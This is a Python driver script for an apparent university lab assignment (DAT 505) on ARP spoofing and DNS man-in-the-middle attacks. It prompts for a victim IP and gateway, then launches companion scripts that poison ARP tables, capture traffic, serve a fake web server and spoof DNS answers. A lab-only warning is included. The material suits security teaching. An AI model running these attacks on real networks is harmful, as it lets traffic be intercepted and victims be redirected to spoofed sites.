#!/usr/bin/env python3
"""
Interactive Assignment Demo
Guides through executing all assignment tasks with proper evidence collection
"""

import os
import sys
import time
import subprocess
import json
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

def print_banner():
    """Print demo banner"""
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}ARP SPOOFING & DNS MitM DEMONSTRATION")
    print(f"{Fore.CYAN}DAT 505 Assignment - Complete Demo")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

def check_requirements():
    """Check if running as root and all files exist"""
    if os.geteuid() != 0:
        print(f"{Fore.RED} This demo must be run as root (use sudo){Style.RESET_ALL}")
        return False
    
    required_files = [
        'scripts/arp_spoof.py',
        'scripts/traffic_interceptor.py', 
        'scripts/dns_spoof.py',
        'scripts/fake_web_server.py',
        'config/dns_targets.json'
    ]
    
    for file in required_files:
        if not os.path.exists(file):
            print(f"{Fore.RED} Missing required file: {file}{Style.RESET_ALL}")
            return False
    
    print(f"{Fore.GREEN} All requirements met{Style.RESET_ALL}")
    return True

def get_lab_config():
    """Get lab configuration from user"""
    print(f"\n{Fore.YELLOW} Lab Configuration{Style.RESET_ALL}")
    print("Enter your lab network details:")
    
    interface = input("Network interface (e.g., eth0): ").strip()
    victim_ip = input("Victim IP address (e.g., 192.168.1.10): ").strip()
    gateway_ip = input("Gateway IP address (e.g., 192.168.1.1): ").strip()
    
    return interface, victim_ip, gateway_ip

def demo_arp_discovery(interface, victim_ip, gateway_ip):
    """Demonstrate ARP discovery phase"""
    print(f"\n{Fore.CYAN} Phase 1: ARP Discovery{Style.RESET_ALL}")
    print("Discovering MAC addresses on the network...")
    
    # Show current ARP table
    print(f"\n{Fore.BLUE}Current ARP table:{Style.RESET_ALL}")
    subprocess.run(['arp', '-a'])
    
    input(f"\n{Fore.YELLOW}Press Enter to continue to ARP spoofing...{Style.RESET_ALL}")

def demo_arp_spoofing(interface, victim_ip, gateway_ip):
    """Demonstrate ARP spoofing"""
    print(f"\n{Fore.CYAN} Phase 2: ARP Spoofing{Style.RESET_ALL}")
    print("Starting ARP spoofing attack...")
    
    print(f"\n{Fore.YELLOW}Command to run ARP spoofing:{Style.RESET_ALL}")
    print(f"sudo python3 scripts/arp_spoof.py -v {victim_ip} -g {gateway_ip} -i {interface} --verbose")
    
    run_attack = input(f"\n{Fore.YELLOW}Run ARP spoofing for 30 seconds? (y/N): {Style.RESET_ALL}").lower()
    
    if run_attack == 'y':
        try:
            print(f"{Fore.GREEN}Starting ARP spoofing...{Style.RESET_ALL}")
            proc = subprocess.Popen([
                'python3', 'scripts/arp_spoof.py',
                '-v', victim_ip, '-g', gateway_ip, '-i', interface, '--verbose'
            ])
            
            time.sleep(30)
            proc.terminate()
            proc.wait()
            print(f"{Fore.YELLOW}ARP spoofing stopped{Style.RESET_ALL}")
            
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}ARP spoofing interrupted{Style.RESET_ALL}")
            proc.terminate()

def demo_traffic_capture(interface):
    """Demonstrate traffic capture"""
    print(f"\n{Fore.CYAN} Phase 3: Traffic Capture{Style.RESET_ALL}")
    print("Capturing and analyzing network traffic...")
    
    print(f"\n{Fore.YELLOW}Command to run traffic capture:{Style.RESET_ALL}")
    print(f"sudo python3 scripts/traffic_interceptor.py -i {interface} -o pcap_files/demo_capture.pcap --duration 60 --verbose")
    
    run_capture = input(f"\n{Fore.YELLOW}Run traffic capture for 60 seconds? (y/N): {Style.RESET_ALL}").lower()
    
    if run_capture == 'y':
        try:
            print(f"{Fore.GREEN}Starting traffic capture...{Style.RESET_ALL}")
            subprocess.run([
                'python3', 'scripts/traffic_interceptor.py',
                '-i', interface, '-o', 'pcap_files/demo_capture.pcap',
                '--duration', '60', '--verbose'
            ])
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}Traffic capture interrupted{Style.RESET_ALL}")

def demo_fake_server():
    """Demonstrate fake web server"""
    print(f"\n{Fore.CYAN} Phase 4: Fake Web Server{Style.RESET_ALL}")
    print("Setting up fake web server for DNS spoofing demonstration...")
    
    print(f"\n{Fore.YELLOW}Command to run fake server:{Style.RESET_ALL}")
    print(f"sudo python3 scripts/fake_web_server.py -p 80")
    
    run_server = input(f"\n{Fore.YELLOW}Start fake web server? (y/N): {Style.RESET_ALL}").lower()
    
    if run_server == 'y':
        print(f"{Fore.GREEN}Starting fake web server on port 80...{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Access http://localhost/logs to see visitor logs{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop the server{Style.RESET_ALL}")
        
        try:
            subprocess.run(['python3', 'scripts/fake_web_server.py', '-p', '80'])
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}Fake web server stopped{Style.RESET_ALL}")

def demo_dns_spoofing(interface):
    """Demonstrate DNS spoofing"""
    print(f"\n{Fore.CYAN} Phase 5: DNS Spoofing{Style.RESET_ALL}")
    print("Starting DNS spoofing attack...")
    
    # Show DNS targets
    print(f"\n{Fore.BLUE}DNS targets configured:{Style.RESET_ALL}")
    try:
        with open('config/dns_targets.json', 'r') as f:
            import json
            config = json.load(f)
            for domain, ip in config['targets'].items():
                print(f"  {domain} -> {ip}")
    except Exception as e:
        print(f"{Fore.RED}Error reading config: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Command to run DNS spoofing:{Style.RESET_ALL}")
    print(f"sudo python3 scripts/dns_spoof.py -i {interface} -c config/dns_targets.json --verbose")
    
    run_dns = input(f"\n{Fore.YELLOW}Run DNS spoofing? (y/N): {Style.RESET_ALL}").lower()
    
    if run_dns == 'y':
        print(f"{Fore.GREEN}Starting DNS spoofing...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}")
        
        try:
            subprocess.run([
                'python3', 'scripts/dns_spoof.py',
                '-i', interface, '-c', 'config/dns_targets.json', '--verbose'
            ])
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}DNS spoofing stopped{Style.RESET_ALL}")

def demo_evidence_collection():
    """Show evidence collection"""
    print(f"\n{Fore.CYAN} Phase 6: Evidence Collection{Style.RESET_ALL}")
    print("Reviewing collected evidence...")
    
    # List pcap files
    if os.path.exists('pcap_files'):
        pcap_files = [f for f in os.listdir('pcap_files') if f.endswith('.pcap')]
        if pcap_files:
            print(f"\n{Fore.GREEN}PCAP files collected:{Style.RESET_ALL}")
            for file in pcap_files:
                print(f"   pcap_files/{file}")
    
    # List log files
    log_files = [f for f in os.listdir('.') if f.endswith('.json') and 'log' in f]
    if log_files:
        print(f"\n{Fore.GREEN}Log files generated:{Style.RESET_ALL}")
        for file in log_files:
            print(f"   {file}")
    
    print(f"\n{Fore.BLUE}Evidence collection tips:{Style.RESET_ALL}")
    print("   Take screenshots of ARP tables before/after attacks")
    print("   Capture Wireshark screenshots with annotations")
    print("   Save browser screenshots of spoofed pages")
    print("   Document all commands and their output")
    print("   Export analysis results to CSV/JSON")

def main():
    """Main demo function"""
    print_banner()
    
    if not check_requirements():
        sys.exit(1)
    
    print(f"\n{Fore.YELLOW}  WARNING: This demo performs actual network attacks{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Only use in isolated lab environments you control{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Unauthorized use is illegal and unethical{Style.RESET_ALL}")
    
    proceed = input(f"\n{Fore.YELLOW}Proceed with demo? (y/N): {Style.RESET_ALL}").lower()
    if proceed != 'y':
        print(f"{Fore.BLUE}Demo cancelled. Review the scripts individually.{Style.RESET_ALL}")
        sys.exit(0)
    
    # Get lab configuration
    interface, victim_ip, gateway_ip = get_lab_config()
    
    # Create directories
    os.makedirs('pcap_files', exist_ok=True)
    os.makedirs('evidence', exist_ok=True)
    
    # Run demo phases
    try:
        demo_arp_discovery(interface, victim_ip, gateway_ip)
        demo_arp_spoofing(interface, victim_ip, gateway_ip)
        demo_traffic_capture(interface)
        demo_fake_server()
        demo_dns_spoofing(interface)
        demo_evidence_collection()
        
        print(f"\n{Fore.GREEN} Demo completed successfully!{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Next steps:{Style.RESET_ALL}")
        print("  1. Review generated evidence files")
        print("  2. Analyze PCAP files with Wireshark")
        print("  3. Complete the report template")
        print("  4. Document mitigation strategies")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Demo interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Demo error: {e}{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
sudo pip3 install --no-index --find-links . flask colorama --break-system-packages --ignore-installed